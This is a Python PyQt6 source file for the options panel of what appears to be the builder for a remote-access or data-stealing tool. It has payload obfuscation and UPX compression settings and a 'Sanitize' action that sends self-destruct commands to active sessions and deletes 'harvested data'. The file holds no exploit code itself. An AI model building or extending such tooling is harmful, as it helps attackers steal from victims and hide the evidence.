# ui/options_pane.py (Definitive, Final Version)
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QGroupBox, QComboBox, 
                             QCheckBox, QPushButton, QLabel, QMessageBox)
from PyQt6.QtCore import pyqtSignal

class OptionsPane(QWidget):
    sign_out_requested = pyqtSignal(); sanitize_requested = pyqtSignal(); setting_changed = pyqtSignal(str, object)
    def __init__(self, db_manager):
        super().__init__(); self.db = db_manager
        layout = QVBoxLayout(self); layout.addWidget(QLabel("<h2>OPTIONS</h2>"))
        appearance_group = QGroupBox("Appearance"); appearance_layout = QVBoxLayout(appearance_group)
        self.theme_selector = QComboBox(); self.theme_selector.addItems(["Dark (Default)", "Light", "Cyber", "Matrix"]); self.theme_selector.currentTextChanged.connect(lambda val: self.setting_changed.emit("theme", val))
        self.animations_toggle = QCheckBox("Enable Animations"); self.animations_toggle.stateChanged.connect(lambda state: self.setting_changed.emit("animations", bool(state)))
        appearance_layout.addWidget(QLabel("Theme:")); appearance_layout.addWidget(self.theme_selector); appearance_layout.addWidget(self.animations_toggle); layout.addWidget(appearance_group)
        build_group = QGroupBox("Build Process"); build_layout = QVBoxLayout(build_group)
        self.obfuscation_selector = QComboBox(); self.obfuscation_selector.addItems(["None", "Light", "Heavy"]); self.obfuscation_selector.currentTextChanged.connect(lambda val: self.setting_changed.emit("obfuscation", val))
        self.compression_selector = QComboBox(); self.compression_selector.addItems(["None", "Normal (UPX)"]); self.compression_selector.currentTextChanged.connect(lambda val: self.setting_changed.emit("compression", val))
        build_layout.addWidget(QLabel("Obfuscation Level:")); build_layout.addWidget(self.obfuscation_selector); build_layout.addWidget(QLabel("Compression:")); build_layout.addWidget(self.compression_selector); layout.addWidget(build_group)
        layout.addStretch()
        danger_group = QGroupBox("Danger Zone"); danger_layout = QVBoxLayout(danger_group)
        self.sanitize_button = QPushButton("Sanitize All Data"); self.sanitize_button.setStyleSheet("background-color: #ed4245;"); self.sanitize_button.clicked.connect(self.confirm_sanitize)
        danger_layout.addWidget(self.sanitize_button); layout.addWidget(danger_group)
        self.sign_out_button = QPushButton("Sign Out"); self.sign_out_button.clicked.connect(self.sign_out_requested); layout.addWidget(self.sign_out_button)
        self.load_settings()
    def load_settings(self):
        self.theme_selector.setCurrentText(self.db.load_setting("theme", "Dark (Default)"))
        self.animations_toggle.setChecked(self.db.load_setting("animations", True))
        self.obfuscation_selector.setCurrentText(self.db.load_setting("obfuscation", "None"))
        self.compression_selector.setCurrentText(self.db.load_setting("compression", "None"))
    def confirm_sanitize(self):
        msg_box = QMessageBox(self); msg_box.setWindowTitle("CONFIRM SANITIZE"); msg_box.setText("<b><font color='red'>WARNING: THIS IS IRREVERSIBLE.</font></b>")
        msg_box.setInformativeText("This will attempt to send a self-destruct command to all active sessions, delete all harvested data, and clear all session history.\n\nAre you absolutely sure you want to proceed?")
        msg_box.setIcon(QMessageBox.Icon.Warning); msg_box.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No); msg_box.setDefaultButton(QMessageBox.StandardButton.No)
        if msg_box.exec() == QMessageBox.StandardButton.Yes: self.sanitize_requested.emit()